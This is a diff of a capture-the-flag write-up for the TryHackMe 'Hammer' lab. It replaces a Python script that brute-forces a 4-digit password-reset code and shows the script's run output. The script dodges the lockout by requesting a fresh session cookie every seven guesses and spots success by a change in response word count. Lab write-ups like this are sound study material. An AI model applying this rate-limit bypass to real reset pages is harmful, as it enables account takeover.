@@ -232,17 +232,56 @@ cat harvest.txt | wc -l
 ```
 
 
-## 2. Using collected session ids inside a python script to send requests.
+## 2. Creating a new session, then using it to test the OTP code.
+
+> You either can use harvested sessions as a wordlist, or easier as I did, just create a new session then using it. 
 
 ```shell
-python3 brute.py         
-[*] Initiating password reset flow for: tester@hammer.thm
-[+] Initial reset requested. Current Session ID: jtdavpam8b8l157lptn72r4rmo
+python3 brute.py
+[*] Starting OTP Brute Force via Python requests...
+[+] Initial Session Obtained: 8hhp23d5367qhabtucq0j7q3l5
+[*] Attempting Code: 1000 | PHPSESSID: f3jb7foe5dg1otqk5knf7a68d3 | Word Count: 148
+============================================================
+[*] SUCCESS FOUND AT INDEX 1009!
+[+] Recovery Code : 1009
+[+] Active Session: ukd6q6rmrfqs69771goiagmbt7
+[+] Word Count   : 139
+============================================================
 
-[*] Starting OTP Brute-Force (0000 - 9999)...
-[*] Testing OTP range: 1000...
-[*] SUCCESS! Valid OTP Found: 1017 using Session: 8b270aepobtmsamegg2qephn42
-[+] Password successfully reset to: Password123!
+[+] Response Body Excerpt:
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reset Password</title>
+     <link href="/hmr_css/bootstrap.min.css" rel="stylesheet">
+    <script src="/hrm_js/jquery-3.6.0.min.js"></script>
+            <script>
+        let countdownv = 180;
+        function startCountdown() {
+            
+            let timerElement = document.getElementById("countdown");
+                        const hiddenField = document.getElementById("s");
+            let interval = setInterval(function() {
+                countdownv--;
+                                 hiddenField.value = countdownv;
+                if (countdownv <= 0) {
+                    clearInterval(interval);
+                                        //alert("hello");
+                   window.location.href = 'logout.php'; 
+                }
+                timerElement.textContent = "You have " + countdownv + " seconds to enter your code.";
+            }, 1000);
+        }
+    </script>
+</head>
+<body>
+<di
+============================================================
+
 ```
 
 
@@ -250,85 +289,100 @@ python3 brute.py
 
 ```python
 #!/usr/bin/env python3
-import re
 import requests
 
 TARGET_URL = "http://hammer.thm:1337/reset_password.php"
 EMAIL = "tester@hammer.thm"
-NEW_PASSWORD = "Password123!"
 
 
-def get_fresh_session(session_obj):
-    """Triggers a GET request without cookies to obtain a brand new PHPSESSID."""
-    session_obj.cookies.clear()
-    resp = session_obj.get(TARGET_URL)
-    sess_id = resp.cookies.get("PHPSESSID")
-    return sess_id
+def get_phpsessid(session):
+    """Requests a password reset for the target email and retrieves a fresh PHPSESSID."""
+    # Clear old cookies so the server is forced to issue a new session
+    session.cookies.clear()
 
-
-def init_password_reset(session_obj, sess_id):
-    """Submits the target email to trigger the OTP reset workflow for the current session."""
     data = {"email": EMAIL}
-    resp = session_obj.post(TARGET_URL, data=data)
-    return resp
+
+    try:
+        resp = session.post(TARGET_URL, data=data)
+        # Extract PHPSESSID from session cookies
+        return session.cookies.get("PHPSESSID")
+    except requests.RequestException as e:
+        print(f"[-] Request error in get_phpsessid: {e}")
+        return None
+
+
+def submit_recovery_code(session, phpsessid, recovery_code):
+    """Submits a single 4-digit recovery code bound to a specific PHPSESSID."""
+    payload = {"recovery_code": recovery_code, "s": "180"}
+
+    # Explicitly attach the session cookie
+    cookies = {"PHPSESSID": phpsessid}
+
+    try:
+        resp = session.post(TARGET_URL, data=payload, cookies=cookies)
+        return resp.text
+    except requests.RequestException as e:
+        print(f"[-] Request error submitting code {recovery_code}: {e}")
+        return ""
 
 
 def main():
+    print("[*] Starting OTP Brute Force via Python requests...")
+
+    # Create a persistent HTTP session pool
     s = requests.Session()
 
-    print(f"[*] Initiating password reset flow for: {EMAIL}")
-    current_sess = get_fresh_session(s)
-    init_password_reset(s, current_sess)
-    print(
-        f"[+] Initial reset requested. Current Session ID: {current_sess}\n"
-    )
+    phpsessid = get_phpsessid(s)
+    if not phpsessid:
+        print("[-] Failed to retrieve initial PHPSESSID. Exiting...")
+        return
 
-    attempts_on_current_session = 0
+    print(f"[+] Initial Session Obtained: {phpsessid}")
 
-    print("[*] Starting OTP Brute-Force (0000 - 9999)...")
+    for i in range(10000):
+        recovery_code = f"{i:04d}"  # Format index into 4-digit padded string (0000-9999)
 
-    for otp_int in range(0, 10000):
-        otp = f"{otp_int:04d}"
+        # Every 7th attempt, request a new session to stay below the 8-attempt lockout limit
+        if i > 0 and i % 7 == 0:
+            phpsessid = get_phpsessid(s)
+            if not phpsessid:
+                print(
+                    f"[-] Failed to retrieve PHPSESSID at attempt {i}. Retrying..."
+                )
+                continue
 
-        # Rotate session after 7 attempts to bypass rate limit
-        if attempts_on_current_session >= 7:
-            current_sess = get_fresh_session(s)
-            init_password_reset(s, current_sess)
-            attempts_on_current_session = 0
+        response_text = submit_recovery_code(s, phpsessid, recovery_code)
+        word_count = len(response_text.split())
 
-        # Submit OTP guess
-        payload = {"recovery_code": otp, "s133": "1"}
-
-        resp = s.post(TARGET_URL, data=payload)
-        attempts_on_current_session += 1
-
-        # Check for invalid/expired session indicators
-        if "Rate limit exceeded" in resp.text or "Invalid session" in resp.text:
-            current_sess = get_fresh_session(s)
-            init_password_reset(s, current_sess)
-            attempts_on_current_session = 0
-            continue
-
-        # Check for success condition
-        if (
-            "Invalid" not in resp.text
-            and "incorrect" not in resp.text
-            and resp.status_code == 200
-        ):
+        # Real-time progress output every 100 iterations
+        if i % 100 == 0:
             print(
-                f"\n[*] SUCCESS! Valid OTP Found: {otp} using Session: {current_sess}"
+                f"[*] Attempting Code: {recovery_code} | PHPSESSID: {phpsessid} | Word Count: {word_count}",
+                end="\r",
             )
 
-            # Post the new password if prompt follows on the same session
-            final_data = {"password": NEW_PASSWORD, "confirm_password": NEW_PASSWORD}
-            s.post(TARGET_URL, data=final_data)
-            print(f"[+] Password successfully reset to: {NEW_PASSWORD}")
+        # Baseline error response contains exactly 148 words. Any variance indicates success.
+        if word_count != 148 and word_count > 0:
+            print("\n" + "=" * 60)
+            print(f"[*] SUCCESS FOUND AT INDEX {i}!")
+            print(f"[+] Recovery Code : {recovery_code}")
+            print(f"[+] Active Session: {phpsessid}")
+            print(f"[+] Word Count   : {word_count}")
+            print("=" * 60)
+            print("\n[+] Response Body Excerpt:\n")
+            print(response_text[:1000])
+            print("=" * 60)
             break
-
-        if otp_int % 100 == 0:
-            print(f"[*] Testing OTP range: {otp}...", end="\r")
 
 
 if __name__ == "__main__":
     main()
 ```
+
+> Resetting password
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Hammer/Images/Screenshot%20From%202026-07-31%2016-57-56.png)
+
+> Logging in:
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Hammer/Images/Screenshot%20From%202026-07-31%2017-02-25.png)
